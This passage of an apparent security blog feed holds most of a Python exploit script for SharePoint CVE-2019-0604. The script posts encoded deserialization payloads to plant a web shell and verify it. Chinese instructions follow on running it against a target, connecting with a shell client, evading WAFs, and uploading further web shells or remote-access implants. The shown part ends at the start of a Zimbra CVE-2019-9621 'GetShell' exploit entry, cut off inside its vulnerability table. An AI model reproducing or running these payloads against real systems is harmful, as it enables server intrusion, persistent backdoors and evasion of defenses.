30\x30\x35\x36\x30\x30\x31\x37\x30\x30\x35\x37\x30\x30\x35\x36\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x65\x32\x30\x30\x35\x35\x30\x30\x33\x37\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x31\x34\x30\x30\x37\x36\x30\x30\x35\x36\x30\x30\x65\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x39\x36\x30\x30\x36\x36\x30\x30\x30\x32\x30\x30\x38\x32\x30\x30\x35\x37\x30\x30\x31\x36\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x32\x37\x30\x30\x65\x32\x30\x30\x33\x35\x30\x30\x35\x37\x30\x30\x32\x36\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x32\x37\x30\x30\x39\x36\x30\x30\x65\x36\x30\x30\x37\x36\x30\x30\x38\x32\x30\x30\x30\x33\x30\x30\x63\x32\x30\x30\x30\x32\x30\x30\x35\x37\x30\x30\x31\x36\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x32\x37\x30\x30\x65\x32\x30\x30\x39\x34\x30\x30\x65\x36\x30\x30\x34\x36\x30\x30\x35\x36\x30\x30\x38\x37\x30\x30\x66\x34\x30\x30\x36\x36\x30\x30\x38\x32\x30\x30\x32\x32\x30\x30\x64\x33\x30\x30\x64\x33\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x39\x32\x30\x30\x39\x32\x30\x30\x64\x33\x30\x30\x64\x33\x30\x30\x30\x32\x30\x30\x30\x37\x30\x30\x37\x37\x30\x30\x34\x36\x30\x30\x39\x32\x30\x30\x30\x32\x30\x30\x62\x37\x30\x30\x36\x37\x30\x30\x31\x36\x30\x30\x32\x37\x30\x30\x30\x32\x30\x30\x33\x36\x30\x30\x66\x36\x30\x30\x34\x36\x30\x30\x35\x36\x30\x30\x64\x33\x30\x30\x35\x37\x30\x30\x31\x36\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x32\x37\x30'
payload4='\x74\x6F\x6D\x3D\x3D\x3D\x52\x65\x73\x70\x6F\x6E\x73\x65\x2E\x57\x72\x69\x74\x65\x28\x22\x55\x41\x73\x68\x65\x6C\x6C\x22\x29\x3B'
payload5='\x23\x64\x61\x74\x65\x3A\x20\x32\x30\x31\x39\x30\x36\x32\x36\x20\x23\x61\x75\x74\x68\x6F\x72\x3A\x20\x6B\x38\x67\x65\x67\x65'

<p>values = {‘<strong>REQUESTDIGEST’:’0xF4545A48FA093FD290D386F2E317C72EF439C05EABDC8BDF0D81022DAEFE10FF6D4782A17836870BB0EBF673E71DCD6F7E631A1371319881902FDEF3032A16F4,18 Jun 2019 16:41:35 -0000’,<br>‘</strong>EVENTTARGET’:’’,<br>‘<strong>EVENTARGUMENT’:’’,<br>‘</strong>spPickerHasReturnValue’:’’,<br>‘<strong>spPickerReturnValueHolder’:’’,<br>‘</strong>VIEWSTATE’:’/wEPDwULLTIwNTYyMzI3OTQPZBYCZg9kFgQCBQ9kFgICBQ9kFgJmD2QWAgIBD2QWAmYPFgIeBFRleHQFBlBpY2tlcmQCCQ9kFgICBw9kFgwCAw9kFgJmDxYEHgxFcnJvck1lc3NhZ2VlHgtIdG1sTWVzc2FnZQVpPHNwYW4gY2xhc3M9Im1zLWVycm9yIj5BbiBlcnJvciBvY2N1cnJlZC4gQWRtaW5pc3RyYXRvcnMsIHNlZSB0aGUgc2VydmVyIGxvZyBmb3IgbW9yZSBpbmZvcm1hdGlvbi48L3NwYW4+ZAIFD2QWAmYPZBYCZg9kFgJmD2QWAgIBD2QWAmYPDxYCHwBlFgIeCW9ua2V5ZG93bgW1AXZhciBlPWV2ZW50OyBpZighZSkgZT13aW5kb3cuZXZlbnQ7IGlmKCFicm93c2VyaXMuc2FmYXJpICYmIGUua2V5Q29kZT09MTMpIHsgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2N0bDAwX1BsYWNlSG9sZGVyRGlhbG9nQm9keVNlY3Rpb25fY3RsMDdfcXVlcnlCdXR0b24nKS5jbGljaygpOyByZXR1cm4gZmFsc2U7IH1kAgcPZBYCZg8PFgIfAAVpPHNwYW4gY2xhc3M9Im1zLWVycm9yIj5BbiBlcnJvciBvY2N1cnJlZC4gQWRtaW5pc3RyYXRvcnMsIHNlZSB0aGUgc2VydmVyIGxvZyBmb3IgbW9yZSBpbmZvcm1hdGlvbi48L3NwYW4+ZGQCCQ9kFgJmDw8WAh8AZWRkAgsPZBYCZg8PFgIeEkNPTFVNTkRJU1BMQVlOQU1FUxYAZGQCDQ9kFgICAQ9kFgQCAQ8WAh4FdmFsdWUFBkFkZCAtPmQCAw9kFgJmDw8WCh4OQ1VTVE9NUFJPUEVSVFllHgVXaWR0aBsAAAAAAABZQAcAAAAeCUlTQ0hBTkdFRGgeBF8hU0ICgAIeDEVuYWJsZUJyb3dzZWgWGB4OZWRpdG9yT2xkVmFsdWVlHgpSZW1vdmVUZXh0BQZSZW1vdmUfBWUeDU5vTWF0Y2hlc1RleHQFEU5vIE1hdGNoaW5nIEl0ZW1zHgphbGxvd0VtcHR5BQExHg1Nb3JlSXRlbXNUZXh0BQ1Nb3JlIEl0ZW1zLi4uHhhwcmVmZXJDb250ZW50RWRpdGFibGVEaXYFBHRydWUeHXNob3dEYXRhVmFsaWRhdGlvbkVycm9yQm9yZGVyBQVmYWxzZR4LYWxsb3dUeXBlSW4FBWZhbHNlHgppblZhbGlkYXRlBQVmYWxzZR4bRUVBZnRlckNhbGxiYWNrQ2xpZW50U2NyaXB0ZR4eU2hvd0VudGl0eURpc3BsYXlUZXh0SW5UZXh0Qm94BQEwFgICBA8PFgYfBxsAAAAAAABZQAcAAAAeCENzc0NsYXNzBQ1tcy11c2VyZWRpdG9yHwkCggJkFgRmDw8WBB4NVmVydGljYWxBbGlnbgsqJ1N5c3RlbS5XZWIuVUkuV2ViQ29udHJvbHMuVmVydGljYWxBbGlnbgMfCQKAgAhkFgJmD2QWAmYPZBYCZg9kFgJmD2QWBGYPFigeCHRhYmluZGV4BQEwHgdvbmZvY3VzBbEBU3RvcmVPbGRWYWx1ZSgnY3RsMDBfUGxhY2VIb2xkZXJEaWFsb2dCb2R5U2VjdGlvbl9jdGwwNScpOyBzYXZlT2xkRW50aXRpZXMoJ2N0bDAwX1BsYWNlSG9sZGVyRGlhbG9nQm9keVNlY3Rpb25fY3RsMDUnKTsgU3lzLlVJLkRvbUVsZW1lbnQuYWRkQ3NzQ2xhc3ModGhpcywgJ21zLWlucHV0Qm94QWN0aXZlJyk7Hg5hcmlhLW11bHRpbGluZQUEdHJ1ZR4Gb25ibHVyBYEDaWYodHlwZW9mKEV4dGVybmFsQ3VzdG9tQ29udHJvbENhbGxiYWNrKT09J2Z1bmN0aW9uJyl7IGlmKFNob3VsZENhbGxDdXN0b21DYWxsQmFjaygnY3RsMDBfUGxhY2VIb2xkZXJEaWFsb2dCb2R5U2VjdGlvbl9jdGwwNScsZXZlbnQpKXtpZighVmFsaWRhdGVQaWNrZXJDb250cm9sKCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1Jykpe1Nob3dWYWxpZGF0aW9uRXJyb3IoKTtyZXR1cm4gZmFsc2U7fWVsc2Uge0V4dGVybmFsQ3VzdG9tQ29udHJvbENhbGxiYWNrKCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1Jyk7fX19IFN5cy5VSS5Eb21FbGVtZW50LnJlbW92ZUNzc0NsYXNzKHRoaXMsICdtcy1pbnB1dEJveEFjdGl2ZScpOx4Hb25jbGljawVHb25DbGlja1J3KHRydWUsIHRydWUsZXZlbnQsJ2N0bDAwX1BsYWNlSG9sZGVyRGlhbG9nQm9keVNlY3Rpb25fY3RsMDUnKTseCG9uY2hhbmdlBT91cGRhdGVDb250cm9sVmFsdWUoJ2N0bDAwX1BsYWNlSG9sZGVyRGlhbG9nQm9keVNlY3Rpb25fY3RsMDUnKTseB29uUGFzdGUFOmRvcGFzdGUoJ2N0bDAwX1BsYWNlSG9sZGVyRGlhbG9nQm9keVNlY3Rpb25fY3RsMDUnLGV2ZW50KTsfEAUEdHJ1ZR4MQXV0b1Bvc3RCYWNrBQEwHgRyb3dzBQExHgtvbkRyYWdTdGFydAUOY2FuRXZ0KGV2ZW50KTseB29ua2V5dXAFPXJldHVybiBvbktleVVwUncoJ2N0bDAwX1BsYWNlSG9sZGVyRGlhbG9nQm9keVNlY3Rpb25fY3RsMDUnKTseBm9uQ29weQU5ZG9jb3B5KCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1JyxldmVudCk7HgV0aXRsZQUURXh0ZXJuYWwgSXRlbSBQaWNrZXIfAwVQcmV0dXJuIG9uS2V5RG93blJ3KCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1JywgMywgZmFsc2UsIGV2ZW50KTseCnNwZWxsY2hlY2sFBWZhbHNlHg9jb250ZW50RWRpdGFibGUFBHRydWUeDWFyaWEtaGFzcG9wdXAFBHRydWUeBXN0eWxlBTp3b3JkLXdyYXA6IGJyZWFrLXdvcmQ7b3ZlcmZsb3cteDogaGlkZGVuO292ZXJmbG93LXk6IGF1dG87HgRyb2xlBQd0ZXh0Ym94ZAIBDw8WCh4IVGFiSW5kZXgBAAAfBxsAAAAAAABZQAcAAAAeBFJvd3MCAR8faB8JAoACFhIfGQWxAVN0b3JlT2xkVmFsdWUoJ2N0bDAwX1BsYWNlSG9sZGVyRGlhbG9nQm9keVNlY3Rpb25fY3RsMDUnKTsgc2F2ZU9sZEVudGl0aWVzKCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1Jyk7IFN5cy5VSS5Eb21FbGVtZW50LmFkZENzc0NsYXNzKHRoaXMsICdtcy1pbnB1dEJveEFjdGl2ZScpOx8iBT1yZXR1cm4gb25LZXlVcFJ3KCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1Jyk7HyQFFEV4dGVybmFsIEl0ZW0gUGlja2VyHx0FP3VwZGF0ZUNvbnRyb2xWYWx1ZSgnY3RsMDBfUGxhY2VIb2xkZXJEaWFsb2dCb2R5U2VjdGlvbl9jdGwwNScpOx8bBYEDaWYodHlwZW9mKEV4dGVybmFsQ3VzdG9tQ29udHJvbENhbGxiYWNrKT09J2Z1bmN0aW9uJyl7IGlmKFNob3VsZENhbGxDdXN0b21DYWxsQmFjaygnY3RsMDBfUGxhY2VIb2xkZXJEaWFsb2dCb2R5U2VjdGlvbl9jdGwwNScsZXZlbnQpKXtpZighVmFsaWRhdGVQaWNrZXJDb250cm9sKCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1Jykpe1Nob3dWYWxpZGF0aW9uRXJyb3IoKTtyZXR1cm4gZmFsc2U7fWVsc2Uge0V4dGVybmFsQ3VzdG9tQ29udHJvbENhbGxiYWNrKCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1Jyk7fX19IFN5cy5VSS5Eb21FbGVtZW50LnJlbW92ZUNzc0NsYXNzKHRoaXMsICdtcy1pbnB1dEJveEFjdGl2ZScpOx8oBSJkaXNwbGF5OiBub25lO3Bvc2l0aW9uOiBhYnNvbHV0ZTsgHwMFUHJldHVybiBvbktleURvd25SdygnY3RsMDBfUGxhY2VIb2xkZXJEaWFsb2dCb2R5U2VjdGlvbl9jdGwwNScsIDMsIGZhbHNlLCBldmVudCk7Hx8FATAeGnJlbmRlckFzQ29udGVudEVkaXRhYmxlRGl2BQR0cnVlZAICDw8WAh4HVmlzaWJsZWhkZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WAgU0Y3RsMDAkUGxhY2VIb2xkZXJEaWFsb2dCb2R5U2VjdGlvbiRjdGwwNyRxdWVyeUJ1dHRvbgUoY3RsMDAkUGxhY2VIb2xkZXJEaWFsb2dCb2R5U2VjdGlvbiRjdGwwNVdO0+ZP+kKR1gMQud0zVHpuy8sqq7e4YSOgfg1USdFj’,<br>‘<strong>VIEWSTATEGENERATOR’:’A123E449’,<br>ct1+paySection+’$ctl07$queryTextBox’:’’,<br>paySpanData:payload1+’4700440016004700160005002700f60067009600460056002700c200020005002700560037005600e6004700160047009600f600e600640027001600d60056007700f6002700b600c200020065005600270037009600f600e600d3004300e2000300e2000300e2000300c200020034005700c6004700570027005600d300e60056005700470027001600c600c2000200050057002600c60096003600b400560097004500f600b6005600e600d3003300130026006600330083005300630016004600330063004300560033005300d500d500c200020035009700370047005600d600e2004400160047001600e20035005600270067009600360056003700c200020065005600270037009600f600e600d3004300e2000300e2000300e2000300c200020034005700c6004700570027005600d300e60056005700470027001600c600c2000200050057002600c60096003600b400560097004500f600b6005600e600d3002600730073001600530036005300630013009300330043005600030083009300a300c300f300’+payload2+’5600c300f200d400560047008600f6004600e4001600d6005600e300d000a0000200020002000200c300d400560047008600f60046000500160027001600d60056004700560027003700e300d000a000020002000200020002000200c3001600e600970045009700070056000200870037009600a3004700970007005600d3002200870037004600a3003700470027009600e60076002200e3006200c6004700b300250056003700f600570027003600560044009600360047009600f600e600160027009700d000a0008700d600c600e6003700d30022008600470047000700a300f200f2003700360086005600d60016003700e200d600960036002700f6003700f60066004700e2003600f600d600f20077009600e60066008700f2002300030003006300f20087001600d600c600f20007002700560037005600e6004700160047009600f600e6002200d000a0008700d600c600e6003700a3008700d30022008600470047000700a300f200f2003700360086005600d60016003700e200d600960036002700f6003700f60066004700e2003600f600d600f20077009600e60066008700f2002300030003006300f20087001600d600c6002200d000a0008700d600c600e6003700a30035009700370047005600d600d30022003600c6002700d200e6001600d600560037000700160036005600’+payload3+’0e200250056000700c6001600360056008200070077004600b2002200d300d300d3002200c200220022009200b300560067001600c60082003600f60046005600c20022005700e600370016006600560022009200b3000200d700b3005200e500620076004700b3000200620076004700b3000200220052003400f600d600d600f600e60005002700f600760027001600d60064009600c600560037005200c500d400960036002700f6003700f600660047000200350086001600270056004600c500750056002600020035005600270067005600270002005400870047005600e60037009600f600e6003700c50013005300c50045005400d4000500c400140045005400c500c40014009500f400550045003500c50057001600e2001600370007008700220002006200c6004700b300f20035009700370047005600d600a3003500470027009600e6007600620076004700b300d000a000900090006200c6004700b300f200f4002600a600560036004700440016004700160005002700f60067009600460056002700e200d400560047008600f60046000500160027001600d60056004700560027003700620076004700b300d000a00090006200c6004700b300f200f4002600a600560036004700440016004700160005002700f60067009600460056002700620076004700b300d000a0006200c6004700b300f200250056003700f600570027003600560044009600360047009600f600e600160027009700620076004700b300d000a000c300f2001600e60097004500970007005600e300d000a0000200020002000200c300f200d400560047008600f60046000500160027001600d60056004700560027003700e300d000a00002000200c300f20005002700f600a6005600360047005600460005002700f600070056002700470097000300e300d000a000c300f2005400870007001600e6004600560046007500270016000700070056002700f400660085001600d600c600250056001600460056002700f4002600a600560036004700440016004700160005002700f60067009600460056002700e300’,<br>ct1+paySection+ct2+’$OriginalEntities’:’&lt;Entities /&gt;’,<br>ct1+paySection+ct2+’$HiddenEntityKey’:’’,<br>ct1+paySection+ct2+’$HiddenEntityDisplayText’:’’,<br>ct1+paySection+ct2+’$downlevelTextBox’:’&nbsp;’,<br>‘</strong>CALLBACKID’:ct1+paySection+’$ctl07’,<br>‘<strong>CALLBACKPARAM’:’;#;#11;#;#;#’,<br>‘</strong>EVENTVALIDATION’:’/wEdAArGxMN0ZJ7K9w5zktdyYEhBD0ElpjQ1qya+g3gJn5tj2kGdpzwPwReE9qIrxAfsdm2iW+aWbiEcyxsYaScsTlQ450VsGNyXdI9EVzK0gDisZ5XfOLdqAfYHRFskSc14VkFc8gJL9PF80m6F3xAWwiF2sOBSyZzTvibJdZIQ6/yiluhmzA7nAUttaM/XaeAk14GgLvO2vw2Ax/oUZshBCs1rvRIjfjnjQxx1nrwDNJpAlG8icRe2xKLDvCGTmWjcu2A=’}</p>
<p>data = urllib.urlencode(values)<br>req = urllib2.Request(url+spver, data)<br>response = urllib2.urlopen(req)<br>the_page = response.read()<br>print exp+’\n’+payload5<br>print the_page</p>
<p>headers = {<br>    “Accept”: “text/html,application/xhtml+xml,application/xml;q=0.9,<a href="https://www.cnblogs.com/k8gege" target="_blank">image</a>/webp,image/apng,<em>/</em>;q=0.8”,<br>    “Accept-Language”: “en”,<br>    “Cache-Control”: “max-age=0”,<br>    “Connection”: “keep-alive”,<br>    “Cookie”: “PHPSESSID=m2hbrvp548cg6v4ssp0l35kcj7; _ga=GA1.2.2052701472.1532920469; _gid=GA1.2.1351314954.1532920469; __atuvc=3%7C31; __atuvs=5b5e9a0418f6420c001”,<br>    #”User-Agent”: “Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36”,<br>    “Upgrade-Insecure-Requests”: “1”,<br>    uapay: payload4,<br>    }</p>
<p>data = {“<strong>CALLBACKID”: “”,<br>        “</strong>VIEWSTATE”: “”,<br>        ‘ctl00$’+paySection+’$’: “”,<br>        “<strong>CALLBACKID”: “All”,<br>        “</strong>CALLBACKPARAM”: “”}</p>
<p>response = requests.get(shellurl, headers=headers, timeout=5)<br>if response.content==’UAshell’:<br>    print ‘UAshell: ‘+shellurl<br></p></pre><p></p>
</div>
<p>&nbsp;</p>
<p><span style="font-size: 18px;"><strong>实战:</strong></span></p>
<p><span style="font-size: 16px;">python cve-2019-0604-exp.py&nbsp;http://<a href="http://k8gege.github.io" target="_blank">k8gege.github.io</a></span></p>
<p><span style="font-size: 16px;">若成功返回WebShell地址</span></p>
<p><img alt data-original="http://k8gege.org/k8img/posts/CVE-2019-0604_1.png"></p>
<p><span style="font-size: 16px;">UAshell访问报错，大家不要慌，原本设计就是这样子</span></p>
<p><img alt data-original="http://k8gege.org/k8img/posts/CVE-2019-0604_2.png"></p>
<p><span style="font-size: 16px;">使用K8飞刀CMD连接，当然你可以通过CMD下载其它的WebShell过去管理</span></p>
<p><span style="font-size: 16px;">比如菜刀,因为飞刀UA系列的WebShell除了过WAF，均无文件管理功能</span></p>
<p><span style="font-size: 16px;">使用UA而不使用菜刀一句话，是因为菜刀一句话都是POST，容易被WAF拦截</span></p>
<p><span style="font-size: 16px;">当然你传过去后发现目标无WAF或无杀软，再传其它Webshell或植入远控都可以</span></p>
<p><img alt data-original="http://k8gege.org/k8img/posts/CVE-2019-0604_3.png"></p>
<p>&nbsp;</p>
<p><span style="font-size: 18px; color: #ff00ff;"><strong>下载：</strong></span></p>
<p>&nbsp;<a href="https://github.com/k8gege/CVE-2019-0604" target="_blank">https://github.com/k8gege/CVE-2019-0604</a></p>
<p><a href="https://github.com/k8gege/K8tools/raw/master/cve-2019-0604-exp.py" target="_blank">&nbsp;https://github.com/k8gege/K8tools/raw/master/cve-2019-0604-exp.py</a></p>
]]></content>
      <categories>
        <category>Exp</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Exp</tag>
        <tag>Tool</tag>
        <tag>Code</tag>
        <tag>GetShell</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-9621 Zimbra&lt;8.8.11 GetShell Exploit</title>
    <url>/p/19452dd9.html</url>
    <content><![CDATA[<table style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 12px; line-height: 1.5; font-family: 宋体, sans-serif, microsoft yahei, 微软雅黑, tahoma, arial; width: 567px;">
<tbody style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5;">
<tr class="firstRow" style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5;">
<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border: 1px solid #000;" valign="top" width="104">
<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">发现时间</span></p>
</td>
<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: #000 #000 #000 currentcolor; border-style: solid solid solid none; border-width: 1px 1px 1px medium; border-image-source: none; border-image-slice: 100%; border-image-width: 1; border-image-outset: 0; border-image-repeat: stretch;" valign="top" width="463">
<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px;">2019<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">年<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px;">03<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">月<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px;">18<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">日</span></span></span></span></span></span></p>
</td>
</tr>
<tr style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5;">
<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000; border-style: none solid solid; border-width: medium 1px 1px; border-image-source: none; border-image-slice: 100%; border-image-width: 1; border-image-outset: 0; border-image-repeat: stretch;" valign="top" width="104">
<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">威胁目标</span></p>
</td>
<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000 currentcolor; border-style: none solid solid none; border-width: medium 1px 1px medium;" valign="top" width="463">
<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">采用<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px;">Zimbra<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">邮件系统的企业</span></span></span></p>
</td>
</tr>
<tr style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5;">
<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000; border-style: none solid solid; border-width: medium 1px 1px; border-image-source: none; border-image-slice: 100%; border-image-width: 1; border-image-outset: 0; border-image-repeat: stretch;" valign="top" width="104">
<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">主要风险</span></p>
</td>
<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000 currentcolor; border-style: none solid solid none; border-width: medium 1px 1px medium;" valign="top" width="463">
<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">远程代码执行</span></p>
</td>
</tr>
<tr style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5;">
<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000; border-style: none solid solid; border-width: medium 1px 1px; border-image-source: none; border-image-slice: 100%; border-image-width: 1; border-image-outset: 0; border-image-repeat: stretch;" valign="top" width="104">
<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">攻击入口</span></p>
</td>
<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000 currentcolor; border-style: none solid solid none; border-width: medium 1px 1px medium;" valign="top" width="463">
<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px;">localconfig.xml &nbsp;<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">配置文件</span></span></p>
</td>
</tr>
<tr style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5;">
<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000; border-style: none solid solid; border-width: medium 1px 1px; border-image-source: none; border-image-slice: 100%; border-image-width: 1; border-image-outset: 0; border-image-repeat: stretch;" valign="top" width="104">
<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">使用漏洞</span></p>
</td>
<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000 currentcolor; border-style: none solid solid none; border-width: medium 1px 1px medium;" valign="top" width="463">
<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px;">CVE-2019-9621</span></p>
</td>
</tr>
<tr style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5; height: 25px;">
<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000; border-style: none solid solid; border-width: medium 1px 1px; border-image-source: none; border-image-slice: 100%; border-image-width: 1; border-image-outset: 0; border-image-repeat: stretch;" valign="top" width="104">
<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">受影响应用</span></p>
</td>
<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000 currentcolor; border-style: none solid solid none; border-width: medium 1px 1px medium;" valign="top" width="463">
<p style="padding: 0px 0px 5px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; border: none; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px;">ZimbraCollaboration Server 8.8.11&nbsp;<span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">之前的版本都受到影响。</span></span></p>
</td>
</tr>
<tr style="margin: 0px; padding: 0px; font-stretch: normal; line-height: 1.5;">
<td style="margin: 0px; padding: 0px 7px; font-stretch: normal; line-height: 28px; font-family: arial, verdana, sans-serif; border-color: currentcolor #000 #000; border-style: none solid solid; border-width: medium 1px 1px; border-image-source: none; border-image-slice: 100%; border-image-width: 1; border-image-outset: 0; border-image-repeat: stretch;" valign="top" width="104">
<p style="padding: 0px; font-stretch: normal; font-size: 12px; line-height: 24px; font-family: 宋体, sans-serif, microsoft yahei, helvetica, arial, sans-serif; word-wrap: break-word; word-break: break-all; text-indent: 2em; margin-top: 0px; margin-bottom: 0px;"><span style="margin: 0px; padding: 0px; font-stretch: normal; font-size: 16px; line-height: 18.4px; font-family: 宋体;">已知影响</span></p>
</td>
